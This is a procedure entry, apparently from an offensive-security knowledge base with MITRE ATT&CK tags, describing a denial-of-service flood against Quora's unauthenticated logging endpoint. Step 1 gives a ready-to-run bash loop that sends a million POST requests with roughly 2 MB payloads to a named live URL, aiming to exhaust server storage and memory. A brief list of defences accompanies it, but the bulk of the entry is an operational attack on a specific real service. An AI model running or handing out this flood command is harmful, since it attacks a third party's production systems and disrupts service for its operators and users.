---
id: proc-flood-endpoint-001
name: Flood Quora Logging Endpoint for DoS
tags:
  - dos
  - flooding
  - resource-exhaustion
type: procedure
tools: []
tactics:
  - '[[Impact]]'
commands:
  - '[[commands/curl-flood-logging]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[OS Exhaustion Flood]]'
updated_at: '2025-12-14T17:26:30.776Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[OS Exhaustion Flood]]'
---
# Flood Quora Logging Endpoint for DoS

## Summary

This procedure repeatedly sends oversized logging requests to exhaust server storage and memory, resulting in denial of service through performance degradation or crash.

## Description

Building on the oversized payload, automate sending thousands or millions of requests to the endpoint, filling storage with logs. In a web context, this targets Quora's backend without authentication. Use bash loops for amplification. Expected outcomes: Server slowdown, request failures, or service outage due to resource limits.

## Requirements

1. Scriptable HTTP client (curl with bash)
2. High-bandwidth connection for rapid requests
3. Monitoring tools for response times

## Defense

Defensive measures and detection strategies:

- Implement request rate limiting per IP
- Use queuing and asynchronous processing for logs with size caps
- Deploy intrusion detection for anomalous request volumes/sizes

## Objectives

1. Automate repeated oversized requests
2. Observe resource exhaustion effects
3. Achieve DoS on logging and potentially broader services

## Instructions

### Step 1: Setup Flood Loop

**Context**: Use a bash for-loop to send requests in bulk.

**Command** ([[commands/curl-flood-logging]]):
```bash
for i in {1..1000000}; do curl -X POST 'https://log.quora.com/ajax/batched_log_POST' -d 'json=%5B%22'$(python3 -c 'import urllib.parse, json; print(urllib.parse.quote(json.dumps([{"filler": "a" * 2000000}]))')'%5D' --max-time 10; done
```

> Sends 1M requests with 10s timeout each. Expected output: Progressive delays and failures.

### Step 2: Monitor Impact

**Context**: Track response times and errors.

Add --write-out '%{time_total}\n' to curl for timing logs.

## MITRE ATT&CK Mapping

### Tactics

- [[Impact]]

### Techniques

- [[OS Exhaustion Flood]]

### Sub-Techniques


## Commands Used

- [[commands/curl-flood-logging]]

## Tools Used


## Tags

- [[dos]]
- [[flooding]]
